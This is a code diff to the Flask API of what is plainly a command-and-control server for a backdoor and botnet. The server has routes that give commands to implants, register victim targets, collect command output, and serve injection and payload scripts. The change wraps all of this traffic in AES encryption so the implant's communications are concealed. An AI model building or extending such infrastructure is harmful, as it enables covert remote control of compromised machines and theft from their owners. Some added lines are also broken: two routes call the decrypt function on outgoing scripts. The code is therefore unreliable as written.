@@ -27,6 +27,9 @@ Routes list:
 from flask import Blueprint, jsonify, request, session, send_file
 from sqlalchemy.orm import sessionmaker
 from datetime import datetime
+from Crypto.Cipher import AES
+import base64
+import json
 import os
 
 from db.modle import APICommand, APILink, ApiToken, Instraction, Targets, BotNet
@@ -41,6 +44,47 @@ _session = Session()
 
 api = Blueprint('api', __name__)
 
+
+def encrypt_payload(payload):
+    """
+    Encrypts a Python dictionary payload using AES encryption.
+    Args:
+        payload (dict): The payload to encrypt.
+    Returns:
+        dict: A dictionary containing the encrypted payload with nonce, ciphertext, and tag.
+    """
+    payload_json = json.dumps(payload).encode()
+
+    clipher = AES.new(config.ENCRYPTION_KEY, AES.MODE_EAX)
+    ciphertext, tag = clipher.encrypt_and_digest(payload_json)
+
+    return {
+        'nonce': base64.b64encode(clipher.nonce).decode(),
+        'ciphertext': base64.b64encode(ciphertext).decode(),
+        'tag': base64.b64encode(tag).decode()
+    }
+
+def decrypt_payload(encrypted_data):
+    """
+    Decrypts an encrypted payload using AES decryption.
+    Args:
+        encrypted_data (dict): A dictionary containing the encrypted payload with nonce, ciphertext, and tag.
+    Returns:
+        dict: The decrypted payload as a Python dictionary.
+    """
+    # Decode Base64 values back to bytes
+    nonce = base64.b64decode(encrypted_data['nonce'])
+    ciphertext = base64.b64decode(encrypted_data['ciphertext'])
+    tag = base64.b64decode(encrypted_data['tag'])
+
+    # Create cipher with the same key and nonce
+    cipher = AES.new(config.ENCRYPTION_KEY, AES.MODE_EAX, nonce=nonce)
+    decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)
+
+    # Convert bytes back to JSON/dict
+    return json.loads(decrypted_data.decode())
+
+
 # recive excute command from the backdoor
 @api.route('/api/ApiCommand/<target_name>')
 def apiCommand(target_name):
@@ -54,9 +98,11 @@ def apiCommand(target_name):
     """
     if request.method == 'GET':
         try:
-            api_token = request.args.get('token')
-            IP = request.args.get('ip')
-            opreatingSystem = request.args.get('os')
+            data = decrypt_payload(request.args)
+
+            api_token = data.get('token')
+            IP = data.get('ip')
+            opreatingSystem = data.get('os')
             valid = getlist(_session.query(ApiToken).filter_by(token=api_token).all(), sp=',')
 
             if valid:
@@ -70,17 +116,17 @@ def apiCommand(target_name):
                 print(apiCommand)
                 if IP != readFromJson('target-info', target_name)['ip']:
                     update_target_info(target_name, IP, opreatingSystem)
-                return jsonify({'allCommand': apiCommand}), 200
+                return jsonify(encrypt_payload({'allCommand': apiCommand})), 200
             else:
-                return jsonify({'Error': 'Invalid api_token or no api token provided'}), 404
+                return jsonify(encrypt_payload({'Error': 'Invalid api_token or no api token provided'})), 404
         except Exception as e:
             log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
             _session.rollback()
-            return jsonify({'error': 'Server side Error'}), 500
+            return jsonify(encrypt_payload({'error': 'Server side Error'})), 500
         finally:
             _session.close()
     else:
-        return jsonify({'Error': 'Unsupported method'}), 405
+        return jsonify(encrypt_payload({'Error': 'Unsupported method'})), 405
 
 
 @api.route('/api/Apicommand/save_output', methods=['POST'])
@@ -102,14 +148,16 @@ def save_output():
     """
     if request.method == 'POST':
         try:
-            token = request.json.get('token')
-            target_name = request.json.get('target_name')
-            IP = request.json.get('ip')
+            data = decrypt_payload(request.json)
+
+            token = data.get('token')
+            target_name = data.get('target_name')
+            IP = data.get('ip')
             valid = getlist(_session.query(Targets).filter_by(target_name=target_name, token=token).all(), sp=',')
 
             if len(valid) != 0:
-                outputs = request.json.get('output')
-                opreatingSystem = request.json.get('os')
+                outputs = data.get('output')
+                opreatingSystem = data.get('os')
 
                 for output in outputs:
                     update_output(target_name, output[0], output[1])
@@ -123,14 +171,14 @@ def save_output():
                 if IP != readFromJson('target-info', target_name)['ip']:
                     update_target_info(target_name, IP, opreatingSystem)
 
-                return jsonify({'message': 'Outputs were seved'}), 200
+                return jsonify(encrypt_payload({'message': 'Outputs were saved'})), 200
             else:
-                return jsonify({'Error': 'Invalid token or target'}), 403
+                return jsonify(encrypt_payload({'Error': 'Invalid token or target'})), 403
         except Exception as e:
             log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
-            return jsonify({'Error': 'Invalid api_token or no api token provided'}), 404
+            return jsonify(encrypt_payload({'Error': 'Invalid api_token or no api token provided'})), 404
     else:
-        return jsonify({'Error': "Unsupported method or didn't provid target name"}), 405
+        return jsonify(encrypt_payload({'Error': "Unsupported method or didn't provid target name"})), 405
 
 
 @api.route('/api/BotNet/<target_name>')
@@ -144,17 +192,19 @@ def BotNet(target_name):
     """
     if request.method == 'GET':
         try:
-            token = request.args.get('token')
+            data = decrypt_payload(request.args)
+
+            token = data.get('token')
             botNets = getlist(_session.query(BotNet).filter_by(target_name=target_name, token=token).all())
             response = {}
             for botNet in botNets:
                 response[botNet[-2]] = botNet[-1]
-            return jsonify(response), 200
+            return jsonify(encrypt_payload(response)), 200
         except Exception as e:
             log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
-            return jsonify({'Error': 'Invalid api_token or no api token provided'}), 404
+            return jsonify(encrypt_payload({'Error': 'Invalid api_token or no api token provided'})), 404
     else:
-        return jsonify({'Error': "Unsupported method or didn't provid target name"}), 405
+        return jsonify(encrypt_payload({'Error': "Unsupported method or didn't provid target name"})), 405
 
 
 @api.route('/api/registor_target', methods=['POST'])
@@ -174,13 +224,15 @@ def registor_target():
     """
     if request.method == 'POST':
         try:
-            apitoken = request.json.get('token')
-            target_name = request.json.get('target_name')
-            IP = request.json.get('ip')
-            opratingSystem = request.json.get('os')
+            data = decrypt_payload(request.json)
+
+            apitoken = data.get('token')
+            target_name = data.get('target_name')
+            IP = data.get('ip')
+            opratingSystem = data.get('os')
 
             if not apitoken or not target_name:
-                return jsonify({'Error': 'Token or target_name not provided'}), 400
+                return jsonify(encrypt_payload({'Error': 'Token or target_name not provided'})), 400
 
             valid = getlist(_session.query(ApiToken).filter_by(token=apitoken).all(), sp=',')
             if len(valid) != 0:
@@ -199,16 +251,16 @@ def registor_target():
                 _session.add(web)
                 _session.commit()
 
-                return jsonify({'target_name': target_name}), 200
+                return jsonify(encrypt_payload({'target_name': target_name})), 200
             else:
-                return jsonify({'Error': 'Invalid api_token'}), 403
+                return jsonify(encrypt_payload({'Error': 'Invalid api_token'})), 403
         except Exception as e:
             _session.rollback()
             log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
-            return jsonify({'Error': 'Internal server error'}), 500
+            return jsonify(encrypt_payload({'Error': 'Internal server error'})), 500
         finally:
             _session.close()
-    return jsonify({'Error': "Unsupported method or didn't provide target name"}), 405
+    return jsonify(encrypt_payload({'Error': "Unsupported method or didn't provide target name"})), 405
 
 
 @api.route('/api/get_instraction/<target_name>')
@@ -224,9 +276,11 @@ def instarction(target_name):
     """
     if request.method == 'GET':
         try:
-            token = request.args.get('token')
-            IP = request.args.get('ip')
-            opratingSystem = request.args.get('os')
+            data = decrypt_payload(request.args)
+
+            token = data.get('token')
+            IP = data.get('ip')
+            opratingSystem = data.get('os')
             valid = getlist(_session.query(ApiToken).filter_by(token=token).all(), sp=',')
 
             if len(valid) != 0:
@@ -234,51 +288,55 @@ def instarction(target_name):
                 if len(instraction) != 0:
                     if IP != readFromJson('target-info', target_name)['ip']:
                         update_target_info(target_name, IP, opratingSystem)
-                    return jsonify({'delay': instraction[0][1], 'instraction': instraction[0][3]}), 200
-                return jsonify({'Message': 'No instraction found'}), 404
+                    return jsonify(encrypt_payload({'delay': instraction[0][1], 'instraction': instraction[0][3]})), 200
+                return jsonify(encrypt_payload({'Message': 'No instraction found'})), 404
             else:
-                return jsonify({'error': 'Invalid api token'}), 403
+                return jsonify(encrypt_payload({'error': 'Invalid api token'})), 403
         except Exception as e:
             log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
-            return jsonify({'Error': f'Exception {str(e)}'}), 500
+            return jsonify(encrypt_payload({'Error': f'Exception {str(e)}'})), 500
     else:
-        return jsonify({'Error': "Unsupported method or didn't provid target name"}), 405
+        return jsonify(encrypt_payload({'Error': "Unsupported method or didn't provid target name"})), 405
 
 
 
-@api.route('/api/lib/<usePyload>', methods=['GET'])
-def lib(usePyload):
+@api.route('/api/lib/<usePayload>', methods=['GET'])
+def lib(usePayload):
     """
     Endpoint to serve static files from the specified path.
     This endpoint is used to send files like JavaScript libraries or other static resources.
     Args:
-        usePyload (str): The name of the file to be served, formatted in the config.file_path.
+        usePayload (str): The name of the file to be served, formatted in the config.file_path.
     Returns:
         Response: The file is sent as an attachment if it exists, otherwise an error message is returned.
     """
     try:
+        data = decrypt_payload(request.json)
+
         if request.method == 'GET':
-            token = request.json.get('token')
+            token = data.get('token')
             if not token:
                 return jsonify({'Error': 'Token not provided'}), 400
-            opratingSystem = request.json.get('os')
-            ip = request.json.get('ip')
+            opratingSystem = data.get('os')
+            ip = data.get('ip')
             valid = getlist(_session.query(ApiToken).filter_by(token=token).all(), sp=',')
             if len(valid) == 0:
                 return jsonify({'Error': 'Invalid token'}), 403
-            file_path = config.file_path.format(usePyload)
+            file_path = config.file_path.format(usePayload)
             if os.path.exists(file_path):
                 log(f'[ROUT] : {request.endpoint} file: {file_path} is being sent')
                 update_target_info(valid[0][2], ip, opratingSystem)
-                return send_file(file_path, as_attachment=False, mimetype='text/plain')
+                with open(file_path, "r", encoding="utf-8") as f:
+                    script_text = f.read()
+                return jsonify(decrypt_payload({'script': script_text}))
             else:
                 log(f'[ERROR ROUT] : {request.endpoint} error: File not found {file_path}')
-                return jsonify({'Error': 'File not found'}), 404
+                return jsonify(encrypt_payload({'Error': 'File not found'})), 404
         else:
-            return jsonify({'Error': "Unsupported method"}), 405
+            return jsonify(encrypt_payload({'Error': "Unsupported method"})), 405
     except Exception as e:
         log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
-        return jsonify({'Error': 'Internal server error'}), 500
+        return jsonify(encrypt_payload({'Error': 'Internal server error'})), 500
 
 
 @api.route('/api/injection/<target_name>', methods=['GET', 'POST'])
@@ -293,9 +351,11 @@ def injection(target_name):
         JSON response with message or script text, or error message.
     """
     try:
-        token = request.args.get('token') if request.method == 'GET' else request.json.get('token')
-        ip = request.args.get('ip') if request.method == 'GET' else request.json.get('ip')
-        os_type = request.args.get('os') if request.method == 'GET' else request.json.get('os')
+        data = decrypt_payload(request.args)
+
+        token = data.get('token') if request.method == 'GET' else data.get('token')
+        ip = data.get('ip') if request.method == 'GET' else data.get('ip')
+        os_type = data.get('os') if request.method == 'GET' else data.get('os')
 
         update_target_info(target_name, ip, os_type)
         valid = getlist(_session.query(ApiToken).filter_by(token=token).all(), sp=',')
@@ -307,16 +367,16 @@ def injection(target_name):
             if os.path.exists(script_path):
                 with open(script_path, "r", encoding="utf-8") as f:
                     script_text = f.read()
-                return jsonify({'script': script_text}), 200
+                return jsonify(decrypt_payload({'script': script_text})), 200
             else:
-                return jsonify({'message': 'Script not found'}), 404
+                return jsonify(encrypt_payload({'message': 'Script not found'})), 404
 
         elif request.method == 'POST':
             update_code_output(target_name, request.json.get('code_output'))
-            return jsonify({'message': 'Output saved (not implemented)'}), 200
+            return jsonify(encrypt_payload({'message': 'Output saved (not implemented)'})), 200
 
-        return jsonify({'message': 'invalid method'}), 405
+        return jsonify(encrypt_payload({'message': 'invalid method'})), 405
 
     except Exception as e:
         log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
-        return jsonify({'message': 'Error'}), 500
+        return jsonify(encrypt_payload({'message': 'Error'})), 500
